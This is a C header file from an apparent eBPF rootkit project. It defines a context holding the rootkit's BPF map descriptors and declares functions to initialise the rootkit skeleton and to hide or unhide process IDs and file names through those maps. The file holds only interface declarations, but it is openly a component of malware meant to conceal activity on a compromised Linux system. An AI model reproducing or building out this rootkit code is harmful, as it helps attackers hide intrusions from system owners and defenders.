#ifndef __HIDER_H
#define __HIDER_H

#include <bpf/libbpf.h>

#include "config.h"
#include "rootkit.skel.h"

typedef struct {
    struct rootkit *skel;
    int hide_names_map_fd;
    int hide_bpf_map_fd;
    int tracked_pids_map_fd;
    bool is_initialized;
} hider_context_t;

/**
 * @brief Initialize hider with rootkit eBPF skeleton.
 *
 * @param hider_ctx
 * @return int
 */
int hider_init(hider_context_t *hider_ctx);

/**
 * @brief Loads a PID to the rootkit's map to hide it.
 *
 * @param hider_ctx
 * @param pid
 * @return int
 */
int hider_hide_pid(hider_context_t *hider_ctx, pid_t pid);

/**
 * @brief Loads a file name to the rootkit's map to hide it.
 *
 * @param hider_ctx
 * @param filename
 * @return int
 */
int hider_hide_file(hider_context_t *hider_ctx, const char *filename);

/**
 * @brief Removes a PID from the rootkit's map to unhide it.
 *
 * @param hider_ctx
 * @param pid
 * @return int
 */
int hider_unhide_pid(hider_context_t *hider_ctx, pid_t pid);

/**
 * @brief Removes a file name from the rootkit's map to unhide it.
 *
 * @param hider_ctx
 * @param filename
 * @return int
 */
int hider_unhide_file(hider_context_t *hider_ctx, const char *filename);

#endif /* __HIDER_H */
